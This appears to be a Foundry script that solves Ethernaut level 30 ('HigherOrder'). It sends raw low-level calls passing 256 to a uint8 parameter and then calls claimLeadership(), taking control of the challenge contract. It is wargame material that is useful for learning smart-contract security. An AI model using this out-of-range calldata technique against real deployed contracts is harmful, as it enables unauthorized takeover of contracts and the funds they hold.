
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.12;

import {Script, console} from "forge-std/Script.sol";
import {HigherOrder} from "script/Ethernaut30-HigherOrderV2.sol";

contract Solver is Script {
    address higherorder = vm.envAddress("HIGHERORDER_INSTANCE");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));
        
        higherorder.call(abi.encodeWithSignature("registerTreasury(uint8)", 256));
        higherorder.call(abi.encodeWithSignature("claimLeadership()"));

        vm.stopBroadcast();
    }
}

contract SolverV2 is Script {
    HigherOrder higherorder;

    function setUp() public {
        higherorder = new HigherOrder();
    }

    function run() public {
        address(higherorder).call(abi.encodeWithSignature("registerTreasury(uint8)", 256));
        address(higherorder).call(abi.encodeWithSignature("claimLeadership()"));
    }
}
